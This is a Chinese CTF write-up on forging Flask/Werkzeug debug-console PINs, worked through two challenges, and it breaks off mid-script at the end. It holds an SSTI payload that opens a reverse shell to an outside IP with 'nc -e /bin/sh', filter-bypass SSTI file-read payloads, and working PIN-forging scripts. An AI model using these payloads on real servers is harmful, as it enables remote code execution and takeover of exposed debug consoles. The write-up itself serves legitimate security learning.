### 通过国赛一道题来认识flask的debug模式算PIN [CISCN 2019华东南]Double Secret

### 审计

打开环境只有一句**Welcome To Find Secret**，那就扫扫后台

```shell
[14:22:51] Starting:
[14:23:25] 200 -    2KB - /console
[14:23:47] 200 -   17B  - /robots.txt
[14:23:48] 200 -   57B  - /secret
```

进去**console**发现是flask的调试模式，需要pin，暂时不管
robots.txt没发现什么有用了
/secret让我传一个secret

**传1回显d   传d回显1  传12345报错**

![image-20220903142636557](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903142636557.png)

在app.py的报错信息中发现这个，查了一下发现是RC4加密

### SSTI

这题给出了密钥，已知密钥那基本上就是明文，结合flask并且有回显
**可以试试SSTI**

![image-20220903143054457](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903143054457.png)

注意输出要为`Latin1`，UTF-8没有那些字符

![image-20220903143147513](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903143147513.png)

成功回显，先不管console，单纯的试试ssti

```py
#这个payload加密成功反弹shell并得到flag
{{url_for.__globals__.os.popen('nc 1.15.107.150 3296 -e /bin/sh').read()}}
cat /flag.txt
NSSCTF{0a85c600-8655-444f-9ef1-f5818f5fc441}
```

但是我感觉这并不是原题的本意，很可能原题是不能出网的，而正常得到flag会被删除(但nss的环境flag不是以这个开头)

![image-20220903144200841](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903144200841.png)

而且这样做也没用到console

### flask算pin

**因为本地同一文件开环境时pin永远是一样的，这样看来求pin过程没有任何随机因素**
**那么就用这题来学学flask算pin🐎从而夺取console**
**(注：本题flask为python2环境，还有个例题会讲解python3的不同)**

#### 调试前置

在vscode中调试`app.py`(必须是该名字)

在launch.josn中将`      "justMyCode": false`由true变为false(这样才可在调试过程中进入其他文件)

然后，开始调试！

#### 开始调试

> **<font color='skyblue'>环境</font>**
>
> 因为国赛题已经几年了，flask版本早已更新迭代，我就用新版本来学习下调试也可大致了解flask的加密
>
> **flask 2.2.2**
>
> **Python 3.10.6**
>
> **vscode**
>
> **win11**

我们此程最关键的是**pin**，所以我们时刻注意他是什么时候打印出来的，然后**重新调试进入到那一步**

直接调试app.py，四个单步跳过结束调试，在<font color='pink'>**第四个**</font>单步跳过时，终端打印出了pin

那么我们在第四个单步跳过时**单步调试**进入该函数

> **<font color='skyblue'>app.py</font>**
>
> 一直单步跳过，发现在执行该函数时打印了pin
>
> ![image-20220903155828626](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903155828626.png)
>
> 那么我们重新调试，在这一步**单步调试**进入**run_simple**

> <font color='skyblue'>**server.py**</font>
>
> 同样一直单步跳过
>
> ![image-20220903160134938](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903160134938.png)
>
> 你会发现在构造该对象之后便打印出了pin，那我们**单步调试**这一步

> <font color='skyblue'>**`__init__.py`**</font>
>
> 进入该函数之后搜索你就能看到很多pin，那么很明显这一步就是生成pin的地方
>
> ![image-20220903161036744](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903161036744.png)
>
> 单步跳过到这里之后就很有意思了，_log很明显就是打印
> 所以**self.pin**显然就是PIN，那么我们在`if self.pin is None:`这里单步调试看是怎样生成的
>
> ![image-20220903161220005](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903161220005.png)
>
> 接着我们走到这里，可以看到`get_pin_and_cookie_name()`这个函数就是生成pin的地方
> 继续跟进此函数
>
> ```python
> def get_pin_and_cookie_name(
>     app: "WSGIApplication",
> ) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
>     """Given an application object this returns a semi-stable 9 digit pin
>     code and a random key.  The hope is that this is stable between
>     restarts to not make debugging particularly frustrating.  If the pin
>     was forcefully disabled this returns `None`.
> 
>     Second item in the resulting tuple is the cookie name for remembering.
>     """
>     pin = os.environ.get("WERKZEUG_DEBUG_PIN")
>     rv = None
>     num = None
> 
>     # Pin was explicitly disabled
>     if pin == "off":
>         return None, None
> 
>     # Pin was provided explicitly
>     if pin is not None and pin.replace("-", "").isdecimal():
>         # If there are separators in the pin, return it directly
>         if "-" in pin:
>             rv = pin
>         else:
>             num = pin
> 
>     modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
>     username: t.Optional[str]
> 
>     try:
>         # getuser imports the pwd module, which does not exist in Google
>         # App Engine. It may also raise a KeyError if the UID does not
>         # have a username, such as in Docker.
>         username = getpass.getuser()
>     except (ImportError, KeyError):
>         username = None
> 
>     mod = sys.modules.get(modname)
> 
>     # This information only exists to make the cookie unique on the
>     # computer, not as a security feature.
>     probably_public_bits = [
>         username,
>         modname,
>         getattr(app, "__name__", type(app).__name__),
>         getattr(mod, "__file__", None),
>     ]
> 
>     # This information is here to make it harder for an attacker to
>     # guess the cookie name.  They are unlikely to be contained anywhere
>     # within the unauthenticated debug page.
>     private_bits = [str(uuid.getnode()), get_machine_id()]
> 
>     h = hashlib.sha1()
>     for bit in chain(probably_public_bits, private_bits):
>         if not bit:
>             continue
>         if isinstance(bit, str):
>             bit = bit.encode("utf-8")
>         h.update(bit)
>     h.update(b"cookiesalt")
> 
>     cookie_name = f"__wzd{h.hexdigest()[:20]}"
> 
>     # If we need to generate a pin we salt it a bit more so that we don't
>     # end up with the same value and generate out 9 digits
>     if num is None:
>         h.update(b"pinsalt")
>         num = f"{int(h.hexdigest(), 16):09d}"[:9]
> 
>     # Format the pincode in groups of digits for easier remembering if
>     # we don't have a result yet.
>     if rv is None:
>         for group_size in 5, 4, 3:
>             if len(num) % group_size == 0:
>                 rv = "-".join(
>                     num[x : x + group_size].rjust(group_size, "0")
>                     for x in range(0, len(num), group_size)
>                 )
>                 break
>         else:
>             rv = num
> 
>     return rv, cookie_name
> ```
>
> 我们得到了这个，那么rv就是我们需要的东西了
>
> 显然，**pin rv num**这三个值非常重要，我们继续单步跳过
>
> `modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)`
> 这一步将**modename**赋值为**flask.app**，基本上所以flask环境这个值都是如此
>
> `username = getpass.getuser()`
> 这一步得到当前主机用户名**xxxxx**，我的为**25952**
>
> `private_bits = [str(uuid.getnode()), get_machine_id()]`
> 这一步得到`['127872478608824', b'597e57a4-9ce2-4346-a4d6-b52791bc8965']`
>
> `h = hashlib.sha1()`
> 这里定义了h为sha1加密
>
> ```py
> for bit in chain(probably_public_bits, private_bits):
>         if not bit:
>             continue
>         if isinstance(bit, str):
>             bit = bit.encode("utf-8")
>         h.update(bit)
> ```
>
> <font color='skyblue'>**这里开始循环加密**</font>
>
> 第一轮：将当前用户名(**25952**)以sha1加密存入h
>
> 第二轮：**bit**为`b'flask.app'`，经过update后，即**25952flask.app**以sha1加密存入h
>
> 第三轮：**bit**为`b'Flask'`**25952flask.appFlask**
>
> 第四轮：**bit**为`b'C:\\Users\\25952\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\flask\\app.py`这是windows环境，不知道linux环境这个值是怎样的(试完来填坑)，所以现在为
>
> ```abap
> 259525flask.appFlaskC:\\Users\\25952\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\flask\\app.py
> ```
>
> 第五轮：**bit**为`b'127872478608824'`前面得到的uuid，现在为
>
> ```ABAP
> 259525flask.appFlaskC:\\Users\\25952\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\flask\\app.py127872478608824
> ```
>
> 第六轮：bit为`b'597e57a4-9ce2-4346-a4d6-b52791bc8965'`前面的到的id，最后为
>
> ```ABAP
> 259525flask.appFlaskC:\\Users\\25952\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\flask\\app.py127872478608824597e57a4-9ce2-4346-a4d6-b52791bc8965
> ```
>
> 出了循环后又进行了一次`h.update(b"cookiesalt")`，最后的最后为
>
> ```abap
> 259525flask.appFlaskC:\\Users\\25952\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\flask\\app.py127872478608824597e57a4-9ce2-4346-a4d6-b52791bc8965cookiesalt
> ```
>
> `cookie_name = f"__wzd{h.hexdigest()[:20]}"`这一步是`__wzd加上h的前20位`，此时它的值为
>
> ```abap
> __wzdfff9e903aea4a5349592
> ```
>
> 很显然我的机器循环到这里num为None
>
> ```python
> if num is None:
>         h.update(b"pinsalt")
>         num = f"{int(h.hexdigest(), 16):09d}"[:9]
> ```
>
> h再次添加，最后的最后的最后为
>
> ```abap
> 259525flask.appFlaskC:\\Users\\25952\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\flask\\app.py127872478608824597e57a4-9ce2-4346-a4d6-b52791bc8965cookiesaltpinsalt
> ```
>
> num此时则是转十六进制的h的前九位数(本地测试`:09d`加了和没加的结果是一样的)
>
> 最后就是得到rv的运算了，就和**num**有关了
>
> ```python
> for group_size in 5, 4, 3:
>             if len(num) % group_size == 0:
>                 rv = "-".join(
>                     num[x : x + group_size].rjust(group_size, "0")
>                     for x in range(0, len(num), group_size)
>                 )
>                 break
>         else:
>             rv = num
> ```
>
> 当你得到正确的**num**，套入此步就能得到正确的rv，所以无需分析此步加密
>
> 附一张调试到最后的图
>
> ![image-20220903165919490](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903165919490.png)
>
> 附上伪造PIN的代码
>
> ```python
> import hashlib
> 
> h=hashlib.sha1()
> a='25952'
> a1=a.encode('utf-8')
> h.update(a1)
> b='flask.app'
> b1=b.encode('utf-8')
> h.update(b1)
> c='Flask'
> c1=c.encode('utf-8')
> h.update(c1)
> d='C:\\Users\\25952\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\flask\\app.py'
> d1=d.encode('utf-8')
> h.update(d1)
> e='127872478608824'
> e1=e.encode('utf-8')
> h.update(e1)
> f='597e57a4-9ce2-4346-a4d6-b52791bc8965'
> f1=f.encode('utf-8')
> h.update(f1)
> g='cookiesalt'
> g1=g.encode('utf-8')
> h.update(g1)
> i='pinsalt'
> i1=i.encode('utf-8')
> h.update(i1)
> num = f"{int(h.hexdigest(), 16)}"[:9]
> print(h.hexdigest())
> print(num)
> rv=None
> if rv is None:
>     for group_size in 5, 4, 3:
>         if len(num) % group_size == 0:
>             rv = "-".join(
>                 num[x : x + group_size].rjust(group_size, "0")
>                 for x in range(0, len(num), group_size)
>             )
>             break
>     else:
>         rv = num
> print(rv)
> 
> #返回结果和上面一模一样
> 3c700733bd6fa68ba8dfbfc4ca0b21adb18dea3e
> 345037757
> 345-037-757
> ```
>
> 所以到这了，还有两个值的获取方式是未知的，也就是这一步
>
> ```python
> private_bits = [str(uuid.getnode()), get_machine_id()]
> ```
>
> 重新调试到此处
>
> uuid
>
> ```python
> def getnode():
>     """Get the hardware address as a 48-bit positive integer.
> 
>     The first time this runs, it may launch a separate program, which could
>     be quite slow.  If all attempts to obtain the hardware address fail, we
>     choose a random 48-bit number with its eighth bit set to 1 as recommended
>     in RFC 4122.
>     """
>     global _node
>     if _node is not None:
>         return _node
> 
>     for getter in _GETTERS + [_random_getnode]:
>         try:
>             _node = getter()
>         except:
>             continue
>         if (_node is not None) and (0 <= _node < (1 << 48)):
>             return _node
>     assert False, '_random_getnode() returned invalid value: {}'.format(_node)
> ```
>
> `uuid.getnode()`就是当前电脑的MAC地址，`str(uuid.getnode())`则是mac地址的十进制表达式
>
> machine-id
>
> ```python
>     def _generate() -> t.Optional[t.Union[str, bytes]]:
>         linux = b""
> 
>         # machine-id is stable across boots, boot_id is not.
>         for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
>             try:
>                 with open(filename, "rb") as f:
>                     value = f.readline().strip()
>             except OSError:
>                 continue
> 
>             if value:
>                 linux += value
>                 break
> 
>         # Containers share the same machine id, add some cgroup
>         # information. This is used outside containers too but should be
>         # relatively stable across boots.
>         try:
>             with open("/proc/self/cgroup", "rb") as f:
>                 linux += f.readline().strip().rpartition(b"/")[2]
>         except OSError:
>             pass
> 
>         if linux:
>             return linux
> 
>         # On OS X, use ioreg to get the computer's serial number.
>         try:
>             # subprocess may not be available, e.g. Google App Engine
>             # https://github.com/pallets/werkzeug/issues/925
>             from subprocess import Popen, PIPE
> 
>             dump = Popen(
>                 ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE
>             ).communicate()[0]
>             match = re.search(b'"serial-number" = <([^>]+)', dump)
> 
>             if match is not None:
>                 return match.group(1)
>         except (OSError, ImportError):
>             pass
> 
>         # On Windows, use winreg to get the machine guid.
>         if sys.platform == "win32":
>             import winreg
> 
>             try:
>                 with winreg.OpenKey(
>                     winreg.HKEY_LOCAL_MACHINE,
>                     "SOFTWARE\\Microsoft\\Cryptography",
>                     0,
>                     winreg.KEY_READ | winreg.KEY_WOW64_64KEY,
>                 ) as rk:
>                     guid: t.Union[str, bytes]
>                     guid_type: int
>                     guid, guid_type = winreg.QueryValueEx(rk, "MachineGuid")
> 
>                     if guid_type == winreg.REG_SZ:
>                         return guid.encode("utf-8")
> 
>                     return guid
>             except OSError:
>                 pass
> 
>         return None
> 
>     _machine_id = _generate()
>     return _machine_id
> ```
>
> 基本逻辑就是：**首先尝试读取`/etc/machine-id`或者 `/proc/sys/kernel/random/boot_i`中的值，若有就直接返回
> 假如是在win平台下读取不到上面两个文件，就去获取注册表中`SOFTWARE\\Microsoft\\Cryptography`的值，并返回**
>
> 那么算PIN的所有步骤都结束了，看到这么多值可能会觉得得到这些值也十分困难，但其实 **- -**
> 只需要有一个**任意文件读取**就可以获得这些值啦
> 然后你就可以直接控制靶机啦
>
> <font color='pink'>**~❀完结撒花❀~**</font>

#### 回到题目

我将只用读取文件的SSTI来算出PIN
因为环境原因，我的exp显然是不能算出python2.7 flask版本十分落后的PIN的

借用一下exp

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'root'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),
]

private_bits = [
    '274973438824773',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'f855a4d03e8442aa92d2813dfc0bf8c3'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

(貌似只有sha1和md5的区别😢)，不过前面获取的值有一丢丢小区别

首先**cat /proc/self/environ**看看我是谁，`LOGNAME=glzjin`

然后**flask.app和Flask**是不变的

然后再当前的flask版本，文件目录读取的是`app.pyc`的位置，而报错信息中给出了`app.py`的位置
`/usr/local/lib/python2.7/site-packages/flask/app.py`
那么app.pyc的目录就是
`/usr/local/lib/python2.7/site-packages/flask/app.pyc`

读取**/sys/class/net/eth0/address**文件获取uuid，`02:42:ac:02:9f:31`转为十进制为`2485376950065`(记得删掉引号)

最后读取**machine-id**，如果是**docker**环境就先看**/proc/self/cgroup**文件有没有`/docker/一连串字符`
如果没有就访问`/etc/machine-id` 再没有就访问 `/proc/sys/kernel/random/boot_i`(linux环境下一般是一大连串字符串，无 - 减号)

![image-20220903173324729](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903173324729.png)

不仅存在，且第一行有docker，那么**machine-id**的值为`5d20d639dd2ea57801d0f3cda8ac1c5e6ccfebb587c2ab7f316b6fa7625d71ca`

至此，所有值获取完毕，且只通过读取文件

运行exp得到PIN
**109-275-533**

<font color='red'>**激动人心的时刻！！**</font>

访问**/console**，输入**PIN**，**成功！！！😋🥰**

![image-20220903173837412](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903173837412.png)

想怎么控制怎么控制了🤗🤗

![image-20220903174019884](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903174019884.png)

### 参考文章

[从一道ctf题谈谈flask开启debug模式存在的安全问题](https://www.anquanke.com/post/id/197602)

[Flask debug 模式 PIN 码生成机制安全性研究笔记](https://www.cnblogs.com/HacTF/p/8160076.html)

[Flask debug pin安全问题](https://xz.aliyun.com/t/2553#toc-2)

### 例题

#### [GYCTF2020]FlaskApp

算是很经典的flask算pin了

题目有一个**base64**加密和解密，那么直接解密处输入`e3syKzJ9fQ==`也就是`{{2+2}}`回显4，证明有ssti

然后试了试发现`flag os popen system`等等被过滤了(其实还是有很多办法的，拼接一下就好)

##### SSTI bypass

先用常规的SSTI解一下

```python
import requests
import base64

for i in range(0,300):
    payload="{{().__class__.__mro__[-1].__subclasses__()[%s].__init__.__globals__.keys()}}"%i
    payload=payload.encode('utf-8')
    data=base64.b64encode(payload)
    data=str(data,encoding='utf-8')
    d={'text':data}
    url='http://c787580f-7c43-4f02-bbcc-ced3cadec650.node4.buuoj.cn:81/decode'
    r=requests.post(url=url,data=d)
    print(d)
    if "__builtins__" in r.text:
        #print(r.text)
        print(f'[+]:{i}')
        break
    print(f'[-]:{i}')
print('[+]done')

75
```

先找一下**open**能打开文件的东西

或者在命令中扫描

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
```

然后拼接一下，利用`os.listdir`，发现根目录下有**this_is_the_flag.txt**

拼接绕过访问

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
```

倒转绕过访问

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}
```

但是如果flag不叫flag或者藏在不常规位置，就还是能弹shell方便一点吧

##### 算PIN

同样的先访问`/proc/self/environ`发现我是**flaskweb**

然后**flask.app和Flask**不变

然后python3，文件目录应该是`app.py`，报错信息就有了
`/usr/local/lib/python3.7/site-packages/flask/app.py`

**/sys/class/net/eth0/address**读uuid并转十进制

machine-id是在`/etc/machine-id`读出来的

然后运行脚本

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '77041330416476',# str(uuid.getnode()),  /sys/class/net/eth0/address
    '1408f836b0ca514d796cbf8960e45fa1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

122-121-215
```

访问**/console**，成功，随意操控啦

![image-20220903210227053](D:\Typora\note\CTF\web\知识点\flask算PIN.assets\image-20220903210227053.png)



### python3.8前后flask构造pin的区别

#### 前言

起初只是以为flask在python3后把pin的最终加密算法由md5改为了sha1

在做mtctf时发现py3.8后对**machine_id**的获取也有些区别，稍微记录一下

#### py3.8以前

加密函数

```python
def get_pin_and_cookie_name(app):
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == "off":
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace("-", "").isdigit():
        # If there are separators in the pin, return it directly
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", app.__class__.__module__)

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username, 
        modname, 
        getattr(app, "__name__", app.__class__.__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]


    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, text_type):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = "__wzd" + h.hexdigest()[:20]

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = ("%09d" % int(h.hexdigest(), 16))[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name
```

得到**machine_id**的函数

```python
def get_machine_id():
    global _machine_id
    rv = _machine_id
    if rv is not None:
        return rv

    def _generate():
        # docker containers share the same machine id, get the
        # container id instead
        try:
            with open("/proc/self/cgroup") as f:
                value = f.readline()
        except IOError:
            pass
        else:
            value = value.strip().partition("/docker/")[2]

            if value:
                return value

        # Potential sources of secret information on linux.  The machine-id
        # is stable across boots, the boot id is not
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    return f.readline().strip()
            except IOError:
                continue

        # On OS X we can use the computer's serial number assuming that
        # ioreg exists and can spit out that information.
        try:
            # Also catch import errors: subprocess may not be available, e.g.
            # Google App Engine
            # See https://github.com/pallets/werkzeug/issues/925
            from subprocess import Popen, PIPE

            dump = Popen(
                ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE
            ).communicate()[0]
            match = re.search(b'"serial-number" = <([^>]+)', dump)
            if match is not None:
                return match.group(1)
        except (OSError, ImportError):
            pass

        # On Windows we can use winreg to get the machine guid
        wr = None
        try:
            import winreg as wr
        except ImportError:
            try:
                import _winreg as wr
            except ImportError:
                pass
        if wr is not None:
            try:
                with wr.OpenKey(
                    wr.HKEY_LOCAL_MACHINE,
                    "SOFTWARE\Microsoft\Cryptography",
                    0,
                    wr.KEY_READ | wr.KEY_WOW64_64KEY,
                ) as rk:
                    machineGuid, wrType = wr.QueryValueEx(rk, "MachineGuid")
                    if wrType == wr.REG_SZ:
                        return machineGuid.encode("utf-8")
                    else:
                        return machineGuid
            except WindowsError:
                pass

    _machine_id = rv = _generate()
    return rv
```

可以看到得到**machin_id**的逻辑是(一般题目都是linux环境，所以暂不讨论windows环境下，遇到了再补充)

> 首先尝试打开`/proc/self/cgroup`
>
> 如果有这个文件
>
> ​		`value = value.strip().partition("/docker/")[2]`找出**docker**字段后面的值存为value(**必须含docker字段**)
>
> ​		value存在直接**retuen**，返回**machin_id**，不存在进行下一步
>
> 如果没有这个文件
>
> ​		先尝试打开`/etc/machine-id`
>
> ​		如果有这个文件，且里面有值，直接取出**return**，返回**machin_id**
>
> ​		如果没有这个文件，再尝试打开`/proc/sys/kernel/random/boot_id`，存在且有值便**return**

再提一句，python3以前的得到的路径和python3之后稍有区别

```py
py3以前  形如 /usr/local/lib/python2.7/dist-packages/flask/app.pyc
py3以后  形如 /usr/local/lib/python3.8/site-packages/flask/app.py
而我的wsl(py3.8)
/usr/local/lib/python3.8/dist-packages/Flask-2.2.2-py3.8.egg/flask/app.py (说不好有奇怪出题人也是这个路径呢)
```

伪造脚本

```py
#md5
import hashlib
from itertools import chain
probably_public_bits = [
    'root'			#cat /proc/self/environ 看LOGNAME的值 or /etc/passwd 最后一个
    'flask.app',	#默认不变
    'Flask',		#默认不变
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' 
]

private_bits = [
    '274973438824773', #cat /sys/class/net/eth0/address 十六进制转十进制
    'f855a4d03e8442aa92d2813dfc0bf8c3'
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

#### py3.8以后

加密函数

```py
def get_pin_and_cookie_name(
 app: "WSGIApplication",
) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
 """Given an application object this returns a semi-stable 9 digit pin
 code and a random key.  The hope is that this is stable between
 restarts to not make debugging particularly frustrating.  If the pin
 was forcefully disabled this returns `None`.

 Second item in the resulting tuple is the cookie name for remembering.
 """
 pin = os.environ.get("WERKZEUG_DEBUG_PIN")
 rv = None
 num = None

 # Pin was explicitly disabled
 if pin == "off":
     return None, None

 # Pin was provided explicitly
 if pin is not None and pin.replace("-", "").isdecimal():
     # If there are separators in the pin, return it directly
     if "-" in pin:
         rv = pin
     else:
         num = pin

 modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
 username: t.Optional[str]

 try:
     # getuser imports the pwd module, which does not exist in Google
     # App Engine. It may also raise a KeyError if the UID does not
     # have a username, such as in Docker.
     username = getpass.getuser()
 except (ImportError, KeyError):
     username = None

 mod = sys.modules.get(modname)

 # This information only exists to make the cookie unique on the
 # computer, not as a security feature.
 probably_public_bits = [
     username,
     modname,
     getattr(app, "__name__", type(app).__name__),
     getattr(mod, "__file__", None),
 ]

 # This information is here to make it harder for an attacker to
 # guess the cookie name.  They are unlikely to be contained anywhere
 # within the unauthenticated debug page.
 private_bits = [str(uuid.getnode()), get_machine_id()]

 h = hashlib.sha1()
 for bit in chain(probably_public_bits, private_bits):
     if not bit:
         continue
     if isinstance(bit, str):
         bit = bit.encode("utf-8")
     h.update(bit)
 h.update(b"cookiesalt")

 cookie_name = f"__wzd{h.hexdigest()[:20]}"

 # If we need to generate a pin we salt it a bit more so that we don't
 # end up with the same value and generate out 9 digits
 if num is None:
     h.update(b"pinsalt")
     num = f"{int(h.hexdigest(), 16):09d}"[:9]

 # Format the pincode in groups of digits for easier remembering if
 # we don't have a result yet.
 if rv is None:
     for group_size in 5, 4, 3:
         if len(num) % group_size == 0:
             rv = "-".join(
                 num[x : x + group_size].rjust(group_size, "0")
                 for x in range(0, len(num), group_size)
             )
             break
     else:
         rv = num

 return rv, cookie_name
```

这里能看出的区别就是**md5变为sha1**了

得到**machine_id**的函数

```py
 def _generate() -> t.Optional[t.Union[str, bytes]]:
     linux = b""

     # machine-id is stable across boots, boot_id is not.
     for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
         try:
             with open(filename, "rb") as f:
                 value = f.readline().strip()
         except OSError:
             continue

         if value:
             linux += value
             break

     # Containers share the same machine id, add some cgroup
     # information. This is used outside containers too but should be
     # relatively stable across boots.
     try:
         with open("/proc/self/cgroup", "rb") as f:
             linux += f.readline().strip().rpartition(b"/")[2]
     except OSError:
         pass

     if linux:
         return linux

     # On OS X, use ioreg to get the computer's serial number.
     try:
         # subprocess may not be available, e.g. Google App Engine
         # https://github.com/pallets/werkzeug/issues/925
         from subprocess import Popen, PIPE

         dump = Popen(
             ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE
         ).communicate()[0]
         match = re.search(b'"serial-number" = <([^>]+)', dump)

         if match is not None:
             return match.group(1)
     except (OSError, ImportError):
         pass

     # On Windows, use winreg to get the machine guid.
     if sys.platform == "win32":
         import winreg

         try:
             with winreg.OpenKey(
                 winreg.HKEY_LOCAL_MACHINE,
                 "SOFTWARE\\Microsoft\\Cryptography",
                 0,
                 winreg.KEY_READ | winreg.KEY_WOW64_64KEY,
             ) as rk:
                 guid: t.Union[str, bytes]
                 guid_type: int
                 guid, guid_type = winreg.QueryValueEx(rk, "MachineGuid")

                 if guid_type == winreg.REG_SZ:
                     return guid.encode("utf-8")

                 return guid
         except OSError:
             pass

     return None

 _machine_id = _generate()
 return _machine_id
```

> (**顺序不同了**)首先访问`/etc/machine-id`，<font color='pink'>有值就**break**</font>，注意不是**return**了
>
> 同样，没值就访问`/proc/sys/kernel/random/boot_id`
>
> 然后！
>
> 不管此时有没有值，再访问`/proc/self/cgroup`
>
> **有值就在上面的基础上加上这个值**
>
> 可以看到，大致有三点不同
> 1.获取顺序改变了
> 2.不再是三选一了，基本上是三选二
> 3.不再判断是否为docker环境了
>
> (网上挺多师傅这里有点小问题)

伪造脚本

```py
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
